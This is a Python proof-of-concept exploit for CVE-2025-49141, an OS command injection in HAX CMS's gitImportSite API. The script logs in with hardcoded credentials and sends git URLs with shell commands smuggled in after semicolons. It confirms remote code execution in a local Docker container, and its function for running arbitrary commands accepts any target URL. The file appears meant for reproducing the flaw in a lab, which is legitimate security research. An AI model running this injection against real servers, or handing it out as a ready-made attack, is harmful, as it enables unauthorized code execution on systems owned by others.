#!/usr/bin/env python3
"""
CVE-2025-49141 - HAX CMS PHP OS Command Injection via gitImportSite
"""
import requests
import sys
import time
import subprocess

TARGET = "http://localhost:8080"
USERNAME = "jeff"
PASSWORD = "jimmerson"


def login(target, username, password):
    url = f"{target}/system/api/login"
    data = {"username": username, "password": password}

    print(f"[*] Logging in as {username}")

    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if "jwt" in result:
                print(f"[+] Login successful")
                return result["jwt"]
        print(f"[-] Login failed: {response.text}")
    except Exception as e:
        print(f"[-] Login error: {e}")

    return None


def exploit_file_creation(target, jwt):
    url = f"{target}/system/api/gitImportSite"

    payload = "http://127.0.0.1/.git;touch${IFS}/tmp/cve_2025_49141;#a=b"

    headers = {"Content-Type": "application/json"}
    data = {
        "site": {"git": {"url": payload}},
        "jwt": jwt
    }

    print(f"\n[*] Sending malicious request to gitImportSite")
    print(f"[*] Payload: {payload}")

    try:
        response = requests.post(url, json=data, headers=headers, timeout=15)
        print(f"[*] Response: {response.status_code}")
        return True
    except Exception as e:
        print(f"[-] Request error: {e}")
        return False


def exploit_command_output(target, jwt, command="id"):
    url = f"{target}/system/api/gitImportSite"

    payload = f"http://127.0.0.1/.git;{command}>/tmp/cmd_output;#a=b"

    headers = {"Content-Type": "application/json"}
    data = {
        "site": {"git": {"url": payload}},
        "jwt": jwt
    }

    print(f"\n[*] Executing command: {command}")
    print(f"[*] Payload: {payload}")

    try:
        response = requests.post(url, json=data, headers=headers, timeout=15)
        return True
    except Exception as e:
        print(f"[-] Request error: {e}")
        return False


def verify_rce():
    print(f"\n[*] Verifying RCE via file creation")

    result = subprocess.run(
        ["docker", "exec", "haxcms-vuln", "ls", "-la", "/tmp/cve_2025_49141"],
        capture_output=True,
        text=True,
    )

    if result.returncode == 0:
        print(f"[+] SUCCESS: /tmp/cve_2025_49141 exists!")
        print(f"[+] {result.stdout.strip()}")
        return True
    return False


def get_command_output():
    result = subprocess.run(
        ["docker", "exec", "haxcms-vuln", "cat", "/tmp/cmd_output"],
        capture_output=True,
        text=True,
    )

    if result.returncode == 0:
        return result.stdout.strip()
    return None


def main():
    print("""
    CVE-2025-49141 - HAX CMS PHP OS Command Injection PoC
    =====================================================
    Vulnerability: gitImportSite OS command injection
    """)

    target = TARGET

    if len(sys.argv) > 1:
        target = sys.argv[1]

    print(f"[*] Target: {target}")
    print("=" * 60)

    jwt = login(target, USERNAME, PASSWORD)
    if not jwt:
        print("[-] Could not obtain JWT token")
        return 1

    subprocess.run(
        ["docker", "exec", "haxcms-vuln", "rm", "-f", "/tmp/cve_2025_49141", "/tmp/cmd_output"],
        capture_output=True,
    )

    exploit_file_creation(target, jwt)

    time.sleep(2)

    if verify_rce():
        print("\n[*] Executing 'id' command to demonstrate RCE...")
        exploit_command_output(target, jwt, "id")
        time.sleep(1)
        output = get_command_output()
        if output:
            print(f"[+] Command output: {output}")

        print("\n" + "=" * 60)
        print("[+] VULNERABILITY CONFIRMED: CVE-2025-49141")
        print("[+] OS command injection via gitImportSite successful!")
        print("=" * 60)
        return 0

    print("\n" + "=" * 60)
    print("[-] Could not confirm RCE")
    print("=" * 60)
    return 1


if __name__ == "__main__":
    sys.exit(main())
